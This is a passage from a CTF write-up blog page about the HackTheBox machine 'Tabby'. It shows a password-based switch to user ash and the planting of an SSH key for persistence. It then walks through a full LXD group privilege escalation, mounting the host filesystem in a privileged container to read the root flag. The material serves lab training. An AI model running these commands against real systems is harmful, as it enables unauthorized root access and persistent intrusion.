+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/$ su - ash</span><br><span class="line">su - ash</span><br><span class="line">Password: admin@it</span><br><span class="line"></span><br><span class="line">ash@tabby:~$</span><br></pre></td></tr></table></figure>
+
+<p>Let’s add our own SSH key to <code>authorized_keys</code> file in order to get a more stable shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:~$  <span class="built_in">echo</span> <span class="string">"ssh-rsa AAAAXXX= hg8@htb.htb"</span> &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>And login again:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb ash@tabby.htb</span><br><span class="line">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Tue May 19 11:48:00 2020</span><br><span class="line">ash@tabby:~$ cat user.txt</span><br><span class="line">8xxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>While doing our usual recon we quickly notice that <code>ash</code> belongs to a few uncommon group:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/$ id</span><br><span class="line">uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>
+
+<p>One particularly interesting is the <code>lxd</code> group.</p>
+<blockquote>
+<p>LXD is a system container manager build on top of LXC (Linux Containers) that is currently supported by Canonical. The goal of LXD is to provide an experience similar to a virtual machine but through containerization rather than hardware virtualization. Compared to Docker for delivering applications, LXD offers nearly full operating-system functionality with additional features such as snapshots, live migrations, and storage management.</p>
+<p><a href="https://linuxcontainers.org/lxd/" target="_blank" rel="noopener">https://linuxcontainers.org/lxd/</a></p>
+</blockquote>
+<p>Doesn’t this remind you a lot of Docker? And Docker have a few interesting way to escalate privileges to root. Probably something similar exist for LXD ? Let’s dig a bit.</p>
+<h3 id="Privilege-Escalation-via-LXD"><a href="#Privilege-Escalation-via-LXD" class="headerlink" title="Privilege Escalation via LXD"></a>Privilege Escalation via LXD</h3><p>After a bit of Google search we stumble upon an interesting article: “<a href="https://shenaniganslabs.io/2019/05/21/LXD-LPE.html" target="_blank" rel="noopener">Linux Privilege Escalation via LXD &amp; Hijacked UNIX Socket Credentials</a>“.</p>
+<p>This idea is to build an LXD container and use the LXD API to mount the host’s root filesystem into this container in order to give our  low-privilege <code>ash</code> user root access to the host filesystem. </p>
+<p>Let’s see how it’s done now.</p>
+<p>First let’s init LXD if it’s not already done:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/$ lxd init</span><br><span class="line">Would you like to use LXD clustering? (yes/no) [default=no]:</span><br><span class="line">Do you want to configure a new storage pool? (yes/no) [default=yes]:</span><br><span class="line">Name of the new storage pool [default=default]:</span><br><span class="line">Name of the storage backend to use (ceph, btrfs, dir, lvm) [default=btrfs]: dir</span><br><span class="line">Would you like to connect to a MAAS server? (yes/no) [default=no]:</span><br><span class="line">Would you like to create a new <span class="built_in">local</span> network bridge? (yes/no) [default=yes]:</span><br><span class="line">What should the new bridge be called? [default=lxdbr0]:</span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:</span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:</span><br><span class="line">Would you like LXD to be available over the network? (yes/no) [default=no]:</span><br><span class="line">Would you like stale cached images to be updated automatically? (yes/no) [default=yes]</span><br><span class="line">Would you like a YAML <span class="string">"lxd init"</span> preseed to be printed? (yes/no) [default=no]:</span><br></pre></td></tr></table></figure>
+
+<p>Then check if images are already present on the system:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc image list</span><br><span class="line">+-------+-------------+--------+-------------+--------------+------+------+-------------+</span><br><span class="line">| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE |</span><br><span class="line">+-------+-------------+--------+-------------+--------------+------+------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>No luck we don’t have any image. We will need to build our own first. Let’s head back to our own machine to do so. I will use the following script to create an basic Alpine container: <a href="https://github.com/saghul/lxd-alpine-builder.git" target="_blank" rel="noopener">LXD Alpine Builder</a>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">[hg8@archpen ~]$ <span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">[hg8@archpen ~]$ sudo ./build-alpine</span><br><span class="line">[sudo] password <span class="keyword">for</span> hg8:</span><br><span class="line">Determining the latest release... v3.12</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span class="line">Downloading alpine-keys-2.2-r0.apk</span><br><span class="line">Downloading apk-tools-static-2.10.5-r1.apk</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK</span><br><span class="line">Verified OK</span><br><span class="line">[...]</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">[hg8@archpen ~]$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200624_1903.tar.gz  build-alpine  LICENSE  README.md</span><br></pre></td></tr></table></figure>
+
+<p>Alright now we upload our newly built image to the server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ scp -i id_rsa_htb alpine-v3.12-x86_64-20200624_1903.tar.gz ash@tabby.htb:/tmp/</span><br><span class="line">alpine-v3.12-x86_64-20200624_1903.tar.gz                          100% 3108KB 270.0KB/s   00:11</span><br></pre></td></tr></table></figure>
+
+<p>We can import it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200624_1903.tar.gz --<span class="built_in">alias</span> hg8</span><br><span class="line">Image imported with fingerprint: 833677b049e4b3128c1b89887b818c555c735f4c112302386965f85a1e171fd1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc image list</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| hg8   | 833677b049e4 | no     | alpine v3.12 (20200624_19:03) | x86_64       | CONTAINER | 3.04MB | Jun 24, 2020 at 5:22pm (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Let’s now assign it security privileges and mount the full disk under <code>/mnt/root</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc init hg8 ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">ash@tabby:/tmp$ lxc config device add ignite hg8-device disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device hg8-device added to ignite</span><br><span class="line">ash@tabby:/tmp$ lxc start ignite</span><br></pre></td></tr></table></figure>
+
+<p>Finally let’s get inside the container and navigate to <code>/mnt/root</code> see all the resources from our host machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line"></span><br><span class="line">~ <span class="comment"># ls /mnt/root/</span></span><br><span class="line">bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var</span><br><span class="line">boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr</span><br><span class="line"></span><br><span class="line">~ <span class="comment"># cd /mnt/root/root/</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt</span></span><br><span class="line">0xxxxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Easy-Box/">Easy Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/LFI/" rel="tag">LFI</a>, <a class="tag-link" href="/tags/john/" rel="tag">john</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/lxc/" rel="tag">lxc</a>, <a class="tag-link" href="/tags/lxd/" rel="tag">lxd</a>, <a class="tag-link" href="/tags/tabby/" rel="tag">tabby</a>, <a class="tag-link" href="/tags/tomcat/" rel="tag">tomcat</a>, <a class="tag-link" href="/tags/war/" rel="tag">war</a>, <a class="tag-link" href="/tags/zip/" rel="tag">zip</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion"><span class="toc-number">1.2.</span> <span class="toc-text">Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-Tomcat-instance"><span class="toc-number">1.3.</span> <span class="toc-text">Analyzing Tomcat instance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-to-Tomcat-conf-files"><span class="toc-number">1.4.</span> <span class="toc-text">LFI to Tomcat conf files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploying-malicious-WAR-package"><span class="toc-number">1.5.</span> <span class="toc-text">Deploying malicious WAR package</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-tomcat-gt-ash-user"><span class="toc-number">1.6.</span> <span class="toc-text">Pivot tomcat -&gt; ash user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-via-LXD"><span class="toc-number">2.2.</span> <span class="toc-text">Privilege Escalation via LXD</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
